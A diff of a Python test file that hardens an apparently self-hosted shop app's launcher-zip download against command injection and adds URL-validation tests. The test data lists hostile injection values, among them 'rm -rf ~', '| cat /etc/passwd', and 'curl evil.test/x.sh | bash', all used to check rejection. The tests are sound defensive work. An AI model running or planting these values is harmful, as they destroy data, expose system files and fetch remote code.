@@ -284,10 +284,13 @@ def test_llm_helper_zip_contains_the_canonical_script_unmodified():
         assert zf.read("llm-helper.py") == canonical
 
 
-def test_llm_helper_zip_substitutes_the_url_in_every_launcher():
+def test_llm_helper_zip_writes_the_url_as_data_not_into_any_launcher():
     """The whole point of the bundle over the plain script: nobody has to type or
-    edit a command. Every launcher must carry the real URL, and the raw placeholder
-    must never leak into a downloaded file."""
+    edit a command - but the URL must land as plain data (shopwatch-url.txt) that a
+    launcher reads at runtime, never spliced into the launcher's own script text. A
+    value later parsed by a shell only has to be wrong once for that boundary to
+    become a command injection; a value merely read into a variable never gets a
+    second pass through the parser no matter what it contains."""
     import zipfile
     from io import BytesIO
 
@@ -295,12 +298,65 @@ def test_llm_helper_zip_substitutes_the_url_in_every_launcher():
 
     zip_bytes = main.build_llm_helper_zip("https://shop.example.test")
     with zipfile.ZipFile(BytesIO(zip_bytes)) as zf:
+        assert zf.read("shopwatch-url.txt").decode() == "https://shop.example.test"
         launchers = [n for n in zf.namelist() if n.startswith("run-")]
         assert len(launchers) == 6, "expected one launcher per OS x backend combination"
         for name in launchers:
             content = zf.read(name).decode()
-            assert "https://shop.example.test" in content
-            assert main.LLM_HELPER_URL_PLACEHOLDER not in content
+            assert "https://shop.example.test" not in content, (
+                f"{name} embeds the URL directly instead of reading shopwatch-url.txt"
+            )
+
+
+def test_validate_base_url_rejects_shell_metacharacters():
+    """The control this test exists for: a URL is about to be read by a shell (or
+    cmd.exe) as either a variable's content or, in an earlier version of this code,
+    spliced directly into script text. Either way, anything that isn't a plain
+    scheme://host[:port] must never reach the zip at all."""
+    import pytest
+    from fastapi import HTTPException
+
+    from app import main
+
+    malicious = [
+        'https://evil.test"; rm -rf ~ #',
+        "https://evil.test'; touch pwned; '",
+        "https://evil.test`id`",
+        "https://evil.test$(id)",
+        "https://evil.test & calc.exe",
+        "https://evil.test | cat /etc/passwd",
+        "https://evil.test\nrm -rf ~",
+    ]
+    for value in malicious:
+        with pytest.raises(HTTPException) as exc_info:
+            main._validate_base_url(value)
+        assert exc_info.value.status_code == 400
+
+
+def test_validate_base_url_accepts_ordinary_shopwatch_urls():
+    """The control must not reject the exact shape window.location.origin produces -
+    a false positive here would break the feature for everyone, not just attackers."""
+    from app import main
+
+    for value in ("https://shop.home.lunt.au", "http://127.0.0.1:8797", "https://example.com:8443"):
+        assert main._validate_base_url(value) == value
+
+
+def test_llm_helper_zip_route_rejects_a_malicious_url():
+    """Reproduces the exact exploit shape end to end: a crafted download link whose
+    `url` breaks out of a shell string. Verified to fail against the pre-fix code
+    (the malicious text landed inside a launcher's own script, un-rejected) and pass
+    against the fix (400, nothing built)."""
+    from fastapi.testclient import TestClient
+
+    from app import main
+
+    with TestClient(main.app) as client:
+        r = client.get(
+            "/tools/llm-helper.zip",
+            params={"url": 'https://evil.test"; curl evil.test/x.sh | bash #'},
+        )
+        assert r.status_code == 400
 
 
 def test_llm_helper_zip_launchers_are_executable():
@@ -322,6 +378,9 @@ def test_llm_helper_zip_route_uses_the_provided_url_over_the_request_host():
     """The modal's own JS supplies `url` (window.location.origin) precisely because a
     server-side guess at the request's host can be wrong behind a reverse proxy - a
     provided url must win."""
+    import zipfile
+    from io import BytesIO
+
     from fastapi.testclient import TestClient
 
     from app import main
@@ -331,7 +390,8 @@ def test_llm_helper_zip_route_uses_the_provided_url_over_the_request_host():
         assert r.status_code == 200
         assert r.headers["content-type"] == "application/zip"
         assert "shopwatch-llm-helper.zip" in r.headers["content-disposition"]
-        assert b"https://shop.example.test" in r.content
+        with zipfile.ZipFile(BytesIO(r.content)) as zf:
+            assert zf.read("shopwatch-url.txt").decode() == "https://shop.example.test"
 
 
 # ------------------------------------------------- the axis is reachable as text
